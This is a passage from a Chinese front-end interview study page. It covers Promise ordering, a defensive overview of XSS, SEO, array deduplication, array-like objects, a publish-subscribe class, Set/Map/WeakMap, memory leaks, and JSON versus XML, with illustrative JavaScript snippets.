punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\np<span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li>构造函数同步执行   &#x2F;&#x2F;1,2</li>\n<li>异步函数异步执行 &#x2F;&#x2F;4,3</li>\n</ul>\n<h3 id=\"18、xss\"><a href=\"#18、xss\" class=\"headerlink\" title=\"18、xss\"></a>18、xss</h3><p>xss（cross-site-scripting）攻击指的是攻击者往 web 页面里插入恶意 html 标签或者 javascript 代码 ；<br>首先代码里对用户输入的地方和变量都需要仔细检查长度和对 “&lt;&gt; , ; . ”等字进行过滤；其次任何内容写到页面之前都必须加 encode，避免不小心把 html tag 弄出来。这一个层面做好，至少可以堵住超过一半的XSS 攻击 ；<br>攻击者在论坛中放一个看似安全的链接，骗取用户点击后，窃取 cookie 中的用户私密信息；或者攻击者在论坛中加一个恶意表单，当用户提交表单的时候，却把信息传送到攻击者的服务器汇总，而不是用户原本以为的信任站点 ；</p>\n<h3 id=\"19、SEO\"><a href=\"#19、SEO\" class=\"headerlink\" title=\"19、SEO\"></a>19、SEO</h3><p>SEO： Search Engine Optimization, 搜索引擎优化。利用搜索引擎的规则提高网站在有关搜索引擎内的自然排名。目的是让其在行业内占据领先地位，获得品牌收益。很大程度上是网站经营者的一种商业行为，将自己或自己公司的排名前移。SEO是提高你网站排名的一个很有效的方法，这个完善和优化你网站的排名因素的方法就是能影响搜索引擎的排名的算法。 因此，SEO是网络营销策略 （online marketing Digital strategy）和数字营销策略 （Digital Marketing strategy）中很重要的一个环节。SEO使你的网站获取得更多的流量（traffic）同时也可以提高你在搜索引擎的排名。那就意味你可以获取得更多的订单，更多的利润。</p>\n<h3 id=\"20、数组去重\"><a href=\"#20、数组去重\" class=\"headerlink\" title=\"20、数组去重\"></a>20、数组去重</h3><p>ES6：</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">let</span>  arr <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">unique</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">arr</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">return</span> Array<span class=\"token punctuation\">.</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Set</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token function\">unique</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> arr <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34</span><span class=\"token punctuation\">,</span> <span class=\"token number\">21</span><span class=\"token punctuation\">,</span> <span class=\"token number\">34</span><span class=\"token punctuation\">,</span> <span class=\"token number\">21</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">unique</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">arr</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">[</span><span class=\"token operator\">...</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Set</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token function\">unique</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p>ES5：</p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> arr <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">23</span><span class=\"token punctuation\">,</span> <span class=\"token number\">12</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">unique</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">arr</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">let</span> Newarr <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> arr<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>Newarr<span class=\"token punctuation\">.</span><span class=\"token function\">indexOf</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      Newarr<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token keyword\">return</span> Newarr<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token function\">unique</span><span class=\"token punctuation\">(</span>arr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<h3 id=\"21、数组和伪数组的区别\"><a href=\"#21、数组和伪数组的区别\" class=\"headerlink\" title=\"21、数组和伪数组的区别\"></a>21、数组和伪数组的区别</h3><ol>\n<li>定义</li>\n</ol>\n<ul>\n<li>数组是一个特殊对象,与常规对象的区别：<ul>\n<li>当由新元素添加到列表中时，自动更新length属性</li>\n<li>设置length属性，可以截断数组</li>\n<li>从Array.protoype中继承了方法</li>\n<li>属性为’Array’</li>\n</ul>\n</li>\n<li>类数组是一个拥有length属性，并且他属性为非负整数的普通对象，类数组不能直接调用数组方法。</li>\n</ul>\n<ol>\n<li>区别<br>本质：类数组是简单对象，它的原型关系与数组不同。</li>\n</ol>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token comment\">// 原型关系和原始值转换</span>\n<span class=\"token keyword\">let</span> arrayLike <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token literal-property property\">length</span><span class=\"token operator\">:</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>arrayLike <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Array</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// false</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>arrayLike<span class=\"token punctuation\">.</span><span class=\"token class-name\">__proto__</span><span class=\"token punctuation\">.</span>constructor <span class=\"token operator\">===</span> Array<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// false</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>arrayLike<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [object Object]</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>arrayLike<span class=\"token punctuation\">.</span><span class=\"token function\">valueOf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// &#123;length: 10&#125;</span>\n\n<span class=\"token keyword\">let</span> array <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>array <span class=\"token keyword\">instanceof</span> <span class=\"token class-name\">Array</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>array<span class=\"token punctuation\">.</span><span class=\"token class-name\">__proto__</span><span class=\"token punctuation\">.</span>constructor <span class=\"token operator\">===</span> Array<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// true</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>array<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// ''</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>array<span class=\"token punctuation\">.</span><span class=\"token function\">valueOf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// []</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ol>\n<li>类数组转换为数组</li>\n</ol>\n<ul>\n<li>转换方法<ul>\n<li>使用 <code>Array.from()</code></li>\n<li>使用 <code>Array.prototype.slice.call()</code></li>\n<li>使用 <code>Array.prototype.forEach()</code> 进行属性遍历并组成新的数组</li>\n</ul>\n</li>\n<li>转换须知<ul>\n<li>转换后的数组长度由 <code>length</code> 属性决定。索引不连续时转换结果是连续的，会自动补位。</li>\n<li>代码示例</li>\n</ul>\n</li>\n</ul>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> al1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token literal-property property\">length</span><span class=\"token operator\">:</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">0</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">1</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">3</span><span class=\"token operator\">:</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">4</span><span class=\"token operator\">:</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">5</span><span class=\"token operator\">:</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>Array<span class=\"token punctuation\">.</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span>al1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">// [0, 1, undefined, 3]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li>②仅考虑 0或正整数 的索引</li>\n</ul>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token comment\">// 代码示例</span>\n<span class=\"token keyword\">let</span> al2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token literal-property property\">length</span><span class=\"token operator\">:</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string-property property\">'-1'</span><span class=\"token operator\">:</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string-property property\">'0'</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    <span class=\"token literal-property property\">a</span><span class=\"token operator\">:</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">1</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>Array<span class=\"token punctuation\">.</span><span class=\"token function\">from</span><span class=\"token punctuation\">(</span>al2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// [0, 1, undefined, undefined]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ul>\n<li>③使用slice转换产生稀疏数组</li>\n</ul>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token comment\">// 代码示例</span>\n<span class=\"token keyword\">let</span> al2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token literal-property property\">length</span><span class=\"token operator\">:</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string-property property\">'-1'</span><span class=\"token operator\">:</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span>\n    <span class=\"token string-property property\">'0'</span><span class=\"token operator\">:</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span>\n    <span class=\"token literal-property property\">a</span><span class=\"token operator\">:</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">,</span>\n    <span class=\"token number\">1</span><span class=\"token operator\">:</span> <span class=\"token number\">1</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Array</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span><span class=\"token function\">slice</span><span class=\"token punctuation\">.</span><span class=\"token function\">call</span><span class=\"token punctuation\">(</span>al2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//[0, 1, empty × 2]</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<ol>\n<li>使用数组方法操作类数组注意地方</li>\n</ol>\n<p><a href=\"https://www.nowcoder.com/study/live/691/2/4#\">复制代码</a></p>\n<pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token keyword\">let</span> arrayLike2 <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token number\">2</span><span class=\"token operator\">:</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span>\n  <span class=\"token number\">3</span><span class=\"token operator\">:</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span>\n  <span class=\"token literal-property property\">length</span><span class=\"token operator\">:</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span>\n  <span class=\"token literal-property property\">push</span><span class=\"token operator\">:</span> <span class=\"token class-name\">Array</span><span class=\"token punctuation\">.</span>prototype<span class=\"token punctuation\">.</span>push\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// push 操作的是索引值为 length 的位置</span>\narrayLike2<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>arrayLike2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// &#123;2: 1, 3: 4, length: 3, push: ƒ&#125;</span>\narrayLike2<span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\nconsole<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>arrayLike2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// &#123;2: 1, 3: 2, length: 4, push: ƒ&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n\n<h3 id=\"22、手写一个发布订阅\"><a href=\"#22、手写一个发布订阅\" class=\"headerlink\" title=\"22、手写一个发布订阅\"></a>22、手写一个发布订阅</h3><pre class=\"line-numbers language-js\" data-language=\"js\"><code class=\"language-js\"><span class=\"token comment\">// 发布订阅中心, on-订阅, off取消订阅, emit发布, 内部需要一个单独事件中心caches进行存储;</span>\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">CacheProps</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token punctuation\">[</span>key<span class=\"token operator\">:</span> string<span class=\"token punctuation\">]</span><span class=\"token operator\">:</span> Array<span class=\"token operator\">&lt;</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data<span class=\"token operator\">?</span><span class=\"token operator\">:</span> unknown</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Observer</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">private</span> <span class=\"token literal-property property\">caches</span><span class=\"token operator\">:</span> CacheProps <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 事件中心</span>\n  <span class=\"token function\">on</span> <span class=\"token punctuation\">(</span>eventName<span class=\"token operator\">:</span> string<span class=\"token punctuation\">,</span> <span class=\"token function-variable function\">fn</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">data<span class=\"token operator\">?</span><span class=\"token operator\">:</span> unknown</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// eventName事件名-独一无二, fn订阅后执行的自定义行为</span>\n    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>caches<span class=\"token punctuation\">[</span>eventName<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>caches<span class=\"token punctuation\">[</span>eventName<span class=\"token punctuation\">]</span> <span class=\"token operator\">||</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>caches<span class=\"token punctuation\">[</span>eventName<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">push</span><span class=\"token punctuation\">(</span>fn<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token function\">emit</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\"><span class=\"token literal-property property\">eventName</span><span class=\"token operator\">:</span> string<span class=\"token punctuation\">,</span> data<span class=\"token operator\">?</span><span class=\"token operator\">:</span> unknown</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 发布 => 将订阅的事件进行统一执行</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>caches<span class=\"token punctuation\">[</span>eventName<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>caches<span class=\"token punctuation\">[</span>eventName<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token function-variable function\">fn</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">data<span class=\"token operator\">?</span><span class=\"token operator\">:</span> unknown</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token function\">fn</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token function\">off</span> <span class=\"token punctuation\">(</span>eventName<span class=\"token operator\">:</span> string<span class=\"token punctuation\">,</span> fn<span class=\"token operator\">?</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">data<span class=\"token operator\">?</span><span class=\"token operator\">:</span> unknown</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token comment\">// 取消订阅 => 若fn不传, 直接取消该事件所有订阅信息</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>caches<span class=\"token punctuation\">[</span>eventName<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">const</span> newCaches <span class=\"token operator\">=</span> fn <span class=\"token operator\">?</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>caches<span class=\"token punctuation\">[</span>eventName<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">e</span> <span class=\"token operator\">=></span> e <span class=\"token operator\">!==</span> fn<span class=\"token punctuation\">)</span> <span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n      <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>caches<span class=\"token punctuation\">[</span>eventName<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> newCaches<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n\n\n\n\n<h3 id=\"23、介绍下-Set、Map、WeakSet-和-WeakMap-的区别？\"><a href=\"#23、介绍下-Set、Map、WeakSet-和-WeakMap-的区别？\" class=\"headerlink\" title=\"23、介绍下 Set、Map、WeakSet 和 WeakMap 的区别？\"></a>23、介绍下 Set、Map、WeakSet 和 WeakMap 的区别？</h3><p><strong>参考答案</strong>：</p>\n<p><strong>Set</strong></p>\n<ol>\n<li>成员不能重复；</li>\n<li>只有键值，没有键名，有点类似数组；</li>\n<li>可以遍历，方法有 <code>add、delete、has</code></li>\n</ol>\n<p><strong>WeakSet</strong></p>\n<ol>\n<li>成员都是对象（引用）；</li>\n<li>成员都是弱引用，随时可以消失（不计入垃圾回收机制）。可以用来保存 DOM 节点，不容易造成内存泄露；</li>\n<li>不能遍历，方法有 <code>add、delete、has</code>；</li>\n</ol>\n<p><strong>Map</strong></p>\n<ol>\n<li>本质上是键值对的集合，类似集合；</li>\n<li>可以遍历，方法很多，可以跟各种数据格式转换；</li>\n</ol>\n<p><strong>WeakMap</strong></p>\n<ol>\n<li>只接收对象为键名（null 除外），不接受其他类型的值作为键名；</li>\n<li>键名指向的对象，不计入垃圾回收机制；</li>\n<li>不能遍历，方法同 <code>get、set、has、delete</code>；</li>\n</ol>\n<h3 id=\"24、简单说说-js-中有哪几种内存泄露的情况\"><a href=\"#24、简单说说-js-中有哪几种内存泄露的情况\" class=\"headerlink\" title=\"24、简单说说 js 中有哪几种内存泄露的情况\"></a>24、简单说说 js 中有哪几种内存泄露的情况</h3><ol>\n<li>意外的全局变量；</li>\n<li>闭包；</li>\n<li>未被清空的定时器；</li>\n<li>未被销毁的事件监听；</li>\n<li>DOM 引用；</li>\n</ol>\n<h3 id=\"25、json和xml数据的区别\"><a href=\"#25、json和xml数据的区别\" class=\"headerlink\" title=\"25、json和xml数据的区别\"></a>25、json和xml数据的区别</h3><p><strong>参考答案</strong>：</p>\n<ol>\n<li>数据体积方面：xml是重量级的，json是轻量级的，传递的速度更快些。</li>\n<li>数据传输方面：xml在传输过程中比较占带宽，json占带宽少，易于压缩。</li>\n<li>数据交互方面：json与javascript的交互更加方便，更容易解析处理，更好的进行数据交互</li>\n<li>数据描述方面：json对数据的描述性比xml较差</li>\n<li>xml和json都用在项目交互下，xml多用于做配置文件，json用于数据交互。</li>\n</ol>\n<h3 id=\"26、JavaScript有几种方法判断变量的类型\"><a href=\"#26、JavaScript有几种方法判断变量的类型\" class=\"headerlink\" 